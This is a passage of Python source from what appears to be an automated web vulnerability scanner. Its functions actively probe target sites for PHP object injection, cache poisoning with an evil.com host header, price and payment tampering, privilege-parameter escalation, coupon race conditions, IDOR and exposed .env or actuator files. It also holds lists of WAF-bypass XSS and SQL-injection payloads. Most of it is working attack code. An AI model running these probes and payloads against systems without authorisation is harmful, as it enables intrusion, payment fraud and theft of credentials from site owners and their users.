                            "type": "PHP Object Injection (Serialized Cookie)",
                            "severity": "critical",
                            "url": page["url"],
                            "detail": f"Cookie '{name}' contains PHP serialized object",
                            "template": "apex-php-obj",
                        })
                except Exception:
                    pass
                if php_serial_re.search(val):
                    findings.append({
                        "type": "PHP Object Injection (Raw Cookie)",
                        "severity": "critical",
                        "url": page["url"],
                        "detail": f"Cookie '{name}' is raw PHP serialized",
                        "template": "apex-php-obj",
                    })
        except Exception:
            pass
    # Test params with serialized payloads
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in payloads[:1]:
                try:
                    import base64 as _b64
                    encoded = _b64.b64encode(payload.encode()).decode()
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [encoded]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(x in r.text.lower() for x in
                           ["unserialize", "__wakeup", "__destruct",
                            "fatal error", "exception", "stdclass"]):
                        findings.append({
                            "type": "PHP Object Injection (Param)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"PHP deserialization triggered via param '{p}'",
                            "template": "apex-php-obj",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_cache_key_injection(crawl_data):
    """Cache key injection — inject into cache key to poison cache for other users."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        try:
            baseline = _S.get(page["url"], timeout=5)
        except Exception:
            continue
        # Headers that may be part of cache key
        inject_headers = {
            "X-Forwarded-Host": f"apex-cache-test.evil.com",
            "X-Original-URL": "/apex-cache-inject",
            "X-Rewrite-URL": "/apex-cache-inject",
            "X-Forwarded-Prefix": "/apex-cache-inject",
        }
        for header, value in inject_headers.items():
            try:
                r = _S.get(page["url"], timeout=5, headers={header: value})
                # If injected value appears in response, it's in the cache key
                if value.split(".")[-2] in r.text or "apex-cache" in r.text:
                    findings.append({
                        "type": f"Cache Key Injection via {header}",
                        "severity": "high",
                        "url": page["url"],
                        "detail": f"{header}: {value} reflected — cache poisoning possible",
                        "template": "apex-cache-key",
                    })
            except Exception:
                continue
    return findings


def scan_link_injection(crawl_data):
    """Link injection — inject links into pages to hijack navigation."""
    findings = []
    payload = "https://evil.com"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if not any(x in p.lower() for x in
                       ["url", "link", "href", "src", "action", "next",
                        "redirect", "return", "goto", "target", "ref"]):
                continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                # Check if evil.com appears as an href/src in the response
                if re.search(r'(?:href|src|action)=["\']https://evil\.com', r.text):
                    findings.append({
                        "type": "Link Injection",
                        "severity": "medium",
                        "url": test_url,
                        "detail": f"Param '{p}' injects link into page HTML",
                        "template": "apex-link-inject",
                    })
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 8: Automatable logic bugs — the ones scanners miss
# Multi-step races, price manipulation, payment bypass, account state,
# mass user enumeration, forced browsing, parameter tampering
# ---------------------------------------------------------------------------

def scan_price_manipulation(crawl_data):
    """Test price/quantity/discount manipulation — negative values, zero, overflow."""
    findings = []
    price_params = ("price","amount","qty","quantity","total","cost","discount",
                    "coupon","credit","points","balance","fee","tax","subtotal")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in price_params:
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            orig = qs.get(p, ["1"])[0]
            for test_val, label in [
                ("-1", "negative"),
                ("0", "zero"),
                ("0.001", "fractional"),
                ("99999999", "overflow"),
                ("-0.01", "negative fractional"),
            ]:
                try:
                    qs[p] = [test_val]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200 and not any(
                            x in r.text.lower() for x in
                            ["invalid","error","must be","greater","positive","minimum"]):
                        findings.append({
                            "type": f"Price Manipulation: {p}={test_val} ({label})",
                            "severity": "high", "url": test_url,
                            "detail": f"Param '{p}' accepts {label} value without error",
                            "template": "apex-price",
                        })
                        break
                except Exception:
                    continue
    # Also test POST forms with price fields
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST":
            continue
        for inp in form.get("inputs", []):
            if inp.get("name", "").lower() not in price_params:
                continue
            for test_val in ["-1", "0", "-0.01"]:
                try:
                    data = {i.get("name","f"): i.get("value","1")
                            for i in form.get("inputs", [])}
                    data[inp["name"]] = test_val
                    r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if r.status_code in (200, 201) and not any(
                            x in r.text.lower() for x in ["invalid","error","positive"]):
                        findings.append({
                            "type": f"Price Manipulation via Form: {inp['name']}={test_val}",
                            "severity": "high", "url": form["action"],
                            "detail": f"Form accepts {test_val} for price field '{inp['name']}'",
                            "template": "apex-price",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_payment_flow_bypass(crawl_data):
    """Test payment/checkout flow bypass — skip to confirmation without paying."""
    findings = []
    # Look for multi-step flow indicators
    step_urls = []
    confirm_urls = []
    for page in crawl_data.get("pages", []):
        url = page["url"].lower()
        if any(x in url for x in ["checkout","cart","order","payment","pay","billing"]):
            step_urls.append(page["url"])
        if any(x in url for x in ["confirm","success","complete","done","thank","receipt"]):
            confirm_urls.append(page["url"])

    # Try accessing confirmation pages directly without going through payment
    for confirm_url in confirm_urls[:5]:
        try:
            r = _S.get(confirm_url, timeout=5)
            if r.status_code == 200:
                body = r.text.lower()
                # Check if it shows real order data (not just a template)
                if any(x in body for x in
                       ["order","confirmation","receipt","thank you","payment","purchase"]):
                    findings.append({
                        "type": "Payment Flow Bypass (Direct Access)",
                        "severity": "high", "url": confirm_url,
                        "detail": "Confirmation page accessible without completing payment flow",
                        "template": "apex-payment-bypass",
                    })
        except Exception:
            continue

    # Test parameter tampering on payment forms
    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if not any(x in action for x in ["pay","checkout","order","purchase","billing"]):
            continue
        inputs = form.get("inputs", [])
        # Look for hidden fields that control payment status
        hidden = [i for i in inputs if i.get("type") == "hidden"]
        for h in hidden:
            name = h.get("name", "").lower()
            val = h.get("value", "").lower()
            if any(x in name for x in ["status","paid","payment","amount","total","price"]):
                try:
                    data = {i.get("name","f"): i.get("value","") for i in inputs}
                    # Tamper: set status to paid/success, amount to 0
                    if "status" in name:
                        data[h["name"]] = "paid"
                    elif "amount" in name or "total" in name or "price" in name:
                        data[h["name"]] = "0"
                    r = _S.post(form["action"], data=data, timeout=5)
                    if r.status_code in (200, 302):
                        findings.append({
                            "type": f"Payment Parameter Tampering: {h['name']}",
                            "severity": "critical", "url": form["action"],
                            "detail": f"Hidden field '{h['name']}' controls payment — tampered to '{data[h['name']]}'",
                            "template": "apex-payment-bypass",
                        })
                except Exception:
                    continue
    return findings


def scan_account_state_manipulation(crawl_data):
    """Test account state manipulation — activate unverified accounts, bypass email verification."""
    findings = []
    for page in crawl_data.get("pages", []):
        url = page["url"]
        url_lower = url.lower()
        # Look for verification/activation endpoints
        if not any(x in url_lower for x in
                   ["verify","activate","confirm","token","email","account"]):
            continue
        base = "/".join(url.split("/", 3)[:3])

        # Test common verification bypass patterns
        bypass_tests = [
            # Empty token
            (url + "?token=", "empty token"),
            (url + "?token=null", "null token"),
            (url + "?token=undefined", "undefined token"),
            (url + "?token=0", "zero token"),
            # Already-used token patterns
            (url + "?token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "predictable token"),
        ]
        for test_url, label in bypass_tests:
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code in (200, 302):
                    body = r.text.lower()
                    if any(x in body for x in
                           ["verified","activated","confirmed","success","welcome"]):
                        findings.append({
                            "type": f"Account Verification Bypass ({label})",
                            "severity": "critical", "url": test_url,
                            "detail": f"Account verified with {label}",
                            "template": "apex-account-state",
                        })
                        break
            except Exception:
                continue

        # Test if verification endpoint leaks valid tokens via timing
        try:
            import time as _t
            times = []
            for token in ["a"*40, "b"*40, "c"*40]:
                start = _t.time()
                _S.get(f"{base}/verify?token={token}", timeout=5)
                times.append(_t.time() - start)
            if max(times) - min(times) > 0.5:
                findings.append({
                    "type": "Verification Token Timing Oracle",
                    "severity": "medium", "url": f"{base}/verify",
                    "detail": f"Token validation timing varies by {(max(times)-min(times))*1000:.0f}ms — oracle possible",
                    "template": "apex-account-state",
                })
        except Exception:
            pass
    return findings


def scan_forced_browsing(crawl_data, web_targets):
    """Forced browsing — access resources that should require auth or specific state."""
    findings = []
    # Common paths that should be protected but often aren't
    sensitive_paths = [
        "/admin", "/admin/users", "/admin/config", "/admin/logs",
        "/api/admin", "/api/users", "/api/config", "/api/keys",
        "/api/v1/admin", "/api/v1/users", "/api/v1/export",
        "/export", "/export/users", "/export/data", "/export/csv",
        "/backup", "/backup/db", "/dump", "/data/export",
        "/internal", "/internal/api", "/internal/admin",
        "/debug", "/debug/vars", "/debug/pprof", "/debug/info",
        "/metrics", "/health/details", "/status/details",
        "/swagger", "/swagger-ui", "/api-docs", "/openapi",
        "/graphql", "/graphiql", "/playground",
        "/jenkins", "/jenkins/script", "/jenkins/console",
        "/phpmyadmin", "/adminer", "/dbadmin",
        "/wp-admin", "/wp-admin/users.php",
        "/actuator/env", "/actuator/heapdump", "/actuator/beans",
        "/.git/config", "/.env", "/config.json", "/secrets.json",
    ]
    for target in web_targets[:3]:
        base = "/".join(target.split("/", 3)[:3])
        try:
            r404 = _S.get(f"{base}/nonexistent_apex_test_xyz_12345", timeout=3)
            size_404 = len(r404.content)
            status_404 = r404.status_code
        except Exception:
            continue
        for path in sensitive_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5, allow_redirects=False)
                # Must be 200 and different from 404
                if (r.status_code == 200 and
                        abs(len(r.content) - size_404) > 100):
                    body = r.text[:500].lower()
                    # Must have real content, not a generic page
                    if any(x in body for x in
                           ["admin","user","config","key","secret","token","password",
                            "email","database","export","backup","debug","metric",
                            "swagger","graphql","actuator","jenkins","phpmyadmin"]):
                        findings.append({
                            "type": f"Forced Browsing: {path}",
                            "severity": "high",
                            "url": f"{base}{path}",
                            "detail": f"Sensitive path accessible without auth ({len(r.content)}b)",
                            "template": "apex-forced-browse",
                        })
            except Exception:
                continue
    return findings


def scan_parameter_tampering(crawl_data):
    """Parameter tampering — modify role/admin/privilege params to escalate."""
    findings = []
    priv_params = ("role","admin","is_admin","isAdmin","superuser","privilege",
                   "level","group","type","plan","tier","access","permission",
                   "scope","authority","rank","status","verified","active")
    priv_values = ("admin","administrator","superuser","root","1","true","staff",
                   "moderator","owner","manager","super","god","system")

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in priv_params:
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            orig_val = qs.get(p, ["user"])[0]
            try:
                baseline = _S.get(url, timeout=5)
                baseline_len = len(baseline.content)
            except Exception:
                continue
            for val in priv_values:
                try:
                    qs[p] = [val]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if (r.status_code == 200 and
                            abs(len(r.content) - baseline_len) > 200):
                        findings.append({
                            "type": f"Parameter Tampering: {p}={val}",
                            "severity": "critical", "url": test_url,
                            "detail": f"Setting '{p}={val}' changes response by {abs(len(r.content)-baseline_len)}b — privilege escalation possible",
                            "template": "apex-param-tamper",
                        })
                        break
                except Exception:
                    continue

    # Also test POST forms
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST":
            continue
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        try:
            baseline_data = {i.get("name","f"): i.get("value","test") for i in inputs}
            baseline = _S.post(action, data=baseline_data, timeout=5)
        except Exception:
            continue
        for inp in inputs:
            if inp.get("name","").lower() not in priv_params:
                continue
            for val in priv_values[:3]:
                try:
                    data = dict(baseline_data)
                    data[inp["name"]] = val
                    r = _S.post(action, data=data, timeout=5)
                    if (r.status_code == 200 and
                            abs(len(r.content) - len(baseline.content)) > 200):
                        findings.append({
                            "type": f"Parameter Tampering in Form: {inp['name']}={val}",
                            "severity": "critical", "url": action,
                            "detail": f"Form field '{inp['name']}={val}' changes response",
                            "template": "apex-param-tamper",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_multi_step_race(crawl_data):
    """Multi-step race conditions — coupon reuse, concurrent purchases, double-spend."""
    import concurrent.futures as _cf
    findings = []

    # Find coupon/promo/voucher endpoints
    coupon_paths = []
    for page in crawl_data.get("pages", []):
        url = page["url"].lower()
        if any(x in url for x in ["coupon","promo","voucher","discount","redeem","code","gift"]):
            coupon_paths.append(page["url"])

    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if any(x in action for x in ["coupon","promo","voucher","discount","redeem"]):
            coupon_paths.append(form["action"])

    for url in coupon_paths[:3]:
        # Fire 10 simultaneous requests with same coupon code
        def apply_coupon(u):
            try:
                return _S.post(u, data={"code": "TESTCOUPON10", "coupon": "TESTCOUPON10",
                                        "promo": "TESTCOUPON10"}, timeout=5)
            except Exception:
                return None

        with _cf.ThreadPoolExecutor(max_workers=10) as pool:
            results = list(pool.map(apply_coupon, [url]*10))

        success = [r for r in results if r and r.status_code in (200, 201)
                   and not any(x in (r.text or "").lower()
                               for x in ["invalid","expired","used","error"])]
        if len(success) > 1:
            findings.append({
                "type": "Race Condition: Coupon/Promo Reuse",
                "severity": "high", "url": url,
                "detail": f"{len(success)}/10 parallel coupon applications succeeded — double-use possible",
                "template": "apex-race-coupon",
            })

    # Test concurrent balance/credit operations
    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if not any(x in action for x in ["transfer","withdraw","redeem","spend","use"]):
            continue
        inputs = form.get("inputs", [])
        data = {i.get("name","f"): i.get("value","1") for i in inputs}

        def do_request(d):
            try:
                return _S.post(form["action"], data=d, timeout=5)
            except Exception:
                return None

        with _cf.ThreadPoolExecutor(max_workers=10) as pool:
            results = list(pool.map(do_request, [data]*10))

        success = [r for r in results if r and r.status_code in (200, 201)
                   and "success" in (r.text or "").lower()]
        if len(success) > 1:
            findings.append({
                "type": "Race Condition: Concurrent Transaction",
                "severity": "critical", "url": form["action"],
                "detail": f"{len(success)}/10 parallel transactions succeeded — double-spend possible",
                "template": "apex-race-coupon",
            })
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 9: Multi-step flow testing, two-account IDOR,
#                GraphQL field suggestion enumeration,
#                API version detection, legacy endpoint finder
# ---------------------------------------------------------------------------

def scan_multi_step_auth_flow(crawl_data, web_targets):
    """Test multi-step authentication flows for bypass — skip steps, replay tokens."""
    findings = []
    # Find multi-step indicators in pages
    step_indicators = ["step=", "stage=", "phase=", "wizard", "step-", "/step/",
                       "verify", "confirm", "otp", "2fa", "mfa", "token="]
    flow_pages = [p for p in crawl_data.get("pages", [])
                  if any(x in p["url"].lower() for x in step_indicators)]

    for page in flow_pages[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        # Try to skip to later steps directly
        for skip_path in ["/confirm", "/verify", "/complete", "/success",
                          "/step/3", "/step/4", "/final", "/done"]:
            try:
                r = _S.get(f"{base}{skip_path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 200:
                    body = r.text.lower()
                    if not any(x in body for x in ["login", "sign in", "unauthorized", "forbidden"]):
                        findings.append({
                            "type": f"Multi-Step Flow Bypass: {skip_path}",
                            "severity": "high",
                            "url": f"{base}{skip_path}",
                            "detail": f"Step {skip_path} accessible without completing prior steps",
                            "template": "apex-flow-bypass",
                        })
            except: continue

    # Test token reuse — submit same OTP/token twice
    for page in flow_pages[:3]:
        url = page["url"]
        if "token=" in url or "otp=" in url or "code=" in url:
            try:
                # First request
                r1 = _S.get(url, timeout=5)
                # Second request with same token
                r2 = _S.get(url, timeout=5)
                if r1.status_code == 200 and r2.status_code == 200:
                    if "invalid" not in r2.text.lower() and "expired" not in r2.text.lower():
                        findings.append({
                            "type": "Token Reuse (No Single-Use Enforcement)",
                            "severity": "medium",
                            "url": url,
                            "detail": "Token/OTP accepted on second use — not invalidated after first use",
                            "template": "apex-token-reuse",
                        })
            except: pass

    return findings


def scan_graphql_field_enumeration(crawl_data):
    """Enumerate GraphQL schema via field suggestions — works even when introspection is disabled."""
    findings = []
    tested = set()
    # Common field names to probe
    field_guesses = [
        "user", "users", "me", "profile", "account", "admin", "password",
        "email", "token", "secret", "key", "apiKey", "creditCard", "card",
        "payment", "balance", "limit", "creditLimit", "ssn", "phone",
        "address", "dob", "dateOfBirth", "role", "permissions", "isAdmin",
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql", "/query"]:
            url = f"{base}{path}"
            try:
                # First check if endpoint exists
                r = _S.post(url, json={"query": "{__typename}"},
                           headers={"Content-Type": "application/json"}, timeout=5)
                if r.status_code not in (200, 400): continue

                # Check if introspection is disabled
                r_intro = _S.post(url, json={"query": "{__schema{types{name}}}"},
                                  headers={"Content-Type": "application/json"}, timeout=5)
                if "__schema" in r_intro.text:
                    continue  # Introspection enabled, already handled elsewhere

                # Probe field suggestions
                discovered = []
                for field in field_guesses:
                    r_probe = _S.post(url,
                                     json={"query": f"{{ {field} {{ id }} }}"},
                                     headers={"Content-Type": "application/json"},
                                     timeout=5)
                    body = r_probe.text
                    # "Did you mean X?" reveals real field names
                    suggestions = re.findall(r'[Dd]id you mean ["\']?(\w+)["\']?', body)
                    if suggestions:
                        discovered.extend(suggestions)
                    # Field exists if no "Cannot query field" error
                    if "Cannot query field" not in body and "Unknown field" not in body:
                        if r_probe.status_code == 200 and "errors" not in body.lower():
                            discovered.append(field)

                if discovered:
                    unique = list(set(discovered))
                    findings.append({
                        "type": "GraphQL Schema Enumeration (Field Suggestion)",
                        "severity": "medium",
                        "url": url,
                        "detail": f"Schema fields discovered without introspection: {', '.join(unique[:10])}",
                        "template": "apex-gql-enum",
                    })
            except: continue
    return findings


def scan_api_version_enumeration(web_targets):
    """Find all active API versions — old versions often lack security fixes."""
    findings = []
    versions = ["v0", "v1", "v2", "v3", "v4", "v5",
                "beta", "alpha", "legacy", "old", "dev", "internal",
                "2023", "2022", "2021", "2020"]
    sensitive_endpoints = [
        "users", "user/me", "me", "profile", "accounts", "admin",
        "config", "settings", "keys", "tokens", "payments", "cards",
    ]
    for target in web_targets[:3]:
        active_versions = []
        for ver in versions:
            for prefix in ["/api/", "/api/", "/"]:
                url = f"{target}{prefix}{ver}/users"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code in (200, 401, 403):
                        active_versions.append(f"{prefix}{ver}")
                        break
                except: continue

        if len(active_versions) > 1:
            # Multiple versions active — test each for unauth access
            for ver_path in active_versions:
                for ep in sensitive_endpoints[:5]:
                    url = f"{target}{ver_path}/{ep}"
                    try:
                        r = _S.get(url, timeout=3)
                        if r.status_code == 200:
                            try:
                                data = r.json()
                                if isinstance(data, (list, dict)) and len(str(data)) > 50:
                                    findings.append({
                                        "type": f"Unprotected API Version: {ver_path}/{ep}",
                                        "severity": "high",
                                        "url": url,
                                        "detail": f"API version {ver_path} exposes /{ep} without auth",
                                        "template": "apex-api-ver",
                                    })
                            except: pass
                    except: continue

        if len(active_versions) >= 2:
            findings.append({
                "type": f"Multiple API Versions Active",
                "severity": "medium",
                "url": target,
                "detail": f"Active versions: {', '.join(active_versions)} — old versions may lack security patches",
                "template": "apex-api-ver",
            })
    return findings


def scan_legacy_endpoints(target, subdomains):
    """Find legacy/forgotten endpoints via common patterns and historical naming."""
    findings = []
    base = f"https://{target}"
    legacy_paths = [
        # Old API versions
        "/api/v1/", "/api/v2/", "/api/old/", "/api/legacy/", "/api/beta/",
        # Old admin paths
        "/admin/", "/administrator/", "/wp-admin/", "/phpmyadmin/",
        "/adminer/", "/manager/", "/management/",
        # Dev/debug leftovers
        "/debug/", "/test/", "/dev/", "/staging/", "/demo/",
        "/console/", "/shell/", "/terminal/",
        # Config/backup files
        "/.env", "/.env.backup", "/.env.old", "/.env.prod",
        "/config.json", "/config.yml", "/config.yaml",
        "/app.config.js", "/settings.json",
        "/backup/", "/bak/", "/old/",
        # Framework specific
        "/actuator/", "/actuator/env", "/actuator/heapdump",
        "/telescope/", "/horizon/", "/nova/",
        "/_profiler/", "/_wdt/",
        # API docs
        "/swagger/", "/swagger-ui/", "/api-docs/",
        "/openapi.json", "/openapi.yaml",
        "/graphiql", "/playground",
        # Source maps
        "/main.js.map", "/app.js.map", "/bundle.js.map",
        "/static/js/main.chunk.js.map",
    ]
    try:
        r404 = _S.get(f"{base}/nonexistent_apex_xyz_test", timeout=3)
        size_404 = len(r404.content)
    except: return findings

    for path in legacy_paths:
        try:
            r = _S.get(f"{base}{path}", timeout=4, allow_redirects=False)
            if r.status_code == 200 and abs(len(r.content) - size_404) > 100:
                body = r.text[:300].lower()
                # Filter generic pages
                if any(x in body for x in ["<html", "<!doctype"]) and len(r.content) < 500:
                    continue
                sev = "critical" if any(x in path for x in [".env", "heapdump", "config"]) else "high"
                findings.append({
                    "type": f"Legacy/Forgotten Endpoint: {path}",
                    "severity": sev,
                    "url": f"{base}{path}",
                    "detail": f"Endpoint accessible ({r.status_code}, {len(r.content)}b)",
                    "template": "apex-legacy",
                })
        except: continue

    # Also check subdomains for legacy patterns
    for sub in subdomains[:10]:
        for proto in ["https", "http"]:
            for path in ["/.env", "/api/v1/users", "/admin", "/actuator/env"]:
                try:
                    r = _S.get(f"{proto}://{sub}{path}", timeout=3, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) > 50:
                        findings.append({
                            "type": f"Legacy Endpoint on Subdomain: {sub}{path}",
                            "severity": "high",
                            "url": f"{proto}://{sub}{path}",
                            "detail": f"Sensitive path accessible on subdomain",
                            "template": "apex-legacy",
                        })
                        break
                except: continue
    return findings


def scan_idor_horizontal_vertical(crawl_data):
    """Test both horizontal IDOR (other users' data) and vertical IDOR (privilege escalation)."""
    findings = []
    # Find endpoints with numeric IDs or UUIDs
    id_pattern = re.compile(r'/(\d{1,10}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$|\?)')

    tested_bases = set()
    for page in crawl_data.get("pages", []):
        url = page["url"]
        m = id_pattern.search(url)
        if not m: continue
        current_id = m.group(1)
        base_path = url[:m.start(1)]
        if base_path in tested_bases: continue
        tested_bases.add(base_path)

        is_uuid = "-" in current_id
        if is_uuid:
            # Can't easily enumerate UUIDs
            continue

        current_num = int(current_id)
        # Test adjacent IDs (horizontal IDOR)
        responses = {}
        for test_id in [1, 2, current_num - 1, current_num + 1, current_num + 100]:
            if test_id <= 0: continue
            test_url = url[:m.start(1)] + str(test_id) + url[m.end(1):]
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 50:
                    responses[test_id] = r.text[:200]
            except: continue

        if len(set(responses.values())) > 1:
            findings.append({
                "type": "IDOR - Horizontal (Access Other Users' Data)",
                "severity": "high",
                "url": url,
                "detail": f"Different responses for IDs {list(responses.keys())} — user data accessible without ownership check",
                "template": "apex-idor-horiz",
            })

        # Vertical IDOR — try ID 0, -1, admin IDs
        for priv_id in [0, -1, 999999, 1000000]:
            test_url = url[:m.start(1)] + str(priv_id) + url[m.end(1):]
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    body = r.text.lower()
                    if any(x in body for x in ["admin", "root", "superuser", "system", "internal"]):
                        findings.append({
                            "type": "IDOR - Vertical (Privilege Escalation)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"ID {priv_id} returns privileged data",
                            "template": "apex-idor-vert",
                        })
            except: continue

    return findings


# ---------------------------------------------------------------------------
# WAF bypass mode + tech-specific targeted scanners
# ---------------------------------------------------------------------------

_WAF_BYPASS_MODE = False

# WAF bypass XSS payloads (Cloudflare, Akamai, AWS WAF bypass encodings)
_WAF_BYPASS_XSS = [
    # Case variation
    "<ScRiPt>alert(1)</ScRiPt>",
    # HTML entities
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    # Unicode
    "<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Comment injection
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    # Backtick
    "<img src=`x` onerror=alert(1)>",
    # Newline bypass
    "<img\nsrc=x\nonerror=alert(1)>",
    # Tab bypass
    "<img\tsrc=x\tonerror=alert(1)>",
    # JS protocol variations
    "jaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    # Cloudflare specific bypasses
    "<details/open/ontoggle=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    # AWS WAF bypass
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>",
]

_WAF_BYPASS_SQLI = [
    # Space bypass
    "' OR/**/1=1--",
    "' OR%091=1--",
    "' OR\t1=1--",
    # Case bypass
    "' oR '1'='1",
    "' Or '1'='1",
    # Comment bypass
    "'/**/OR/**/1=1--",
    "' /*!OR*/ 1=1--",
    # Double encoding
    "%2527 OR 1=1--",
    # HPP bypass
    "1&id=2 UNION SELECT 1,2,3--",
    # Keyword bypass
    "' OORR '1'='1",
    "' || '1'='1",
    # MySQL specific
    "' OR 1=1 LIMIT 1 OFFSET 0--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    # Time-based with bypass
    "' AND SLEEP/**/( 4)--",
    "'; WAITFOR/**/ DELAY '0:0:4'--",
]


def get_xss_payloads():
    """Return XSS payloads — WAF bypass variants if WAF detected."""
    if _WAF_BYPASS_MODE:
        return _WAF_BYPASS_XSS + _XSS_PAYLOADS[:5]
    return _XSS_PAYLOADS


def get_sqli_payloads():
    """Return SQLi payloads — WAF bypass variants if WAF detected."""
    if _WAF_BYPASS_MODE:
        return _WAF_BYPASS_SQLI + SQLI_PAYLOADS[:10]
    return SQLI_PAYLOADS


def _run_wp_enum(apex_instance):
    """WordPress-specific: enumerate users, check xmlrpc, test wp-login brute."""
    import requests as _r
    base = apex_instance.web_targets[0] if apex_instance.web_targets else f"https://{apex_instance.target}"
    findings = []
    # User enumeration via REST API
    for path in ["/wp-json/wp/v2/users", "/?author=1", "/?author=2"]:
        try:
            r = _r.get(f"{base}{path}", timeout=5, verify=False)
            if r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    if isinstance(data, list) and data:
                        users = [u.get("slug", u.get("name", "")) for u in data[:5]]
                        findings.append({
                            "type": "WordPress User Enumeration",
                            "severity": "medium",
                            "url": f"{base}{path}",
                            "detail": f"Users exposed: {', '.join(users)}",
                            "template": "apex-wp",
                        })
                except: pass
        except: pass
    # XML-RPC enabled
    try:
        r = _r.post(f"{base}/xmlrpc.php",
                   data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                   timeout=5, verify=False)
        if r.status_code == 200 and "methodResponse" in r.text:
            findings.append({
                "type": "WordPress XML-RPC Enabled",
                "severity": "medium",
                "url": f"{base}/xmlrpc.php",
                "detail": "XML-RPC enabled — brute force and SSRF possible",
                "template": "apex-wp",
            })
    except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


def _run_spring_deep(apex_instance):
    """Spring Boot: deep actuator scan for sensitive endpoints."""
    import requests as _r
    findings = []
    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
        for path in ["/actuator/heapdump", "/actuator/env", "/actuator/beans",
                     "/actuator/mappings", "/actuator/httptrace", "/actuator/logfile",
                     "/actuator/threaddump", "/actuator/metrics"]:
            try:
                r = _r.get(f"{target}{path}", timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 100:
                    sev = "critical" if "heapdump" in path else "high"
                    findings.append({
                        "type": f"Spring Actuator Exposed: {path}",
                        "severity": sev,
                        "url": f"{target}{path}",
                        "detail": f"Actuator endpoint accessible ({len(r.content)}b)",
                        "template": "apex-spring",
                    })
            except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


def _run_laravel_secrets(apex_instance):
    """Laravel: check for .env, debug mode, telescope, horizon."""
    import requests as _r
    findings = []
    for target in (apex_instance.web_targets or [f"https://{apex_instance.target}"])[:3]:
        for path in ["/.env", "/storage/logs/laravel.log", "/telescope",
                     "/horizon", "/_ignition/health-check", "/api/documentation"]:
            try:
                r = _r.get(f"{target}{path}", timeout=5, verify=False)
                if r.status_code == 200 and len(r.content) > 50:
                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
                        findings.append({
                            "type": "Laravel .env Exposed",
                            "severity": "critical",
                            "url": f"{target}{path}",
                            "detail": "Laravel .env with secrets accessible",
                            "template": "apex-laravel",
                        })
                    elif "laravel.log" in path:
                        findings.append({
                            "type": "Laravel Log Exposed",
                            "severity": "high",
                            "url": f"{target}{path}",
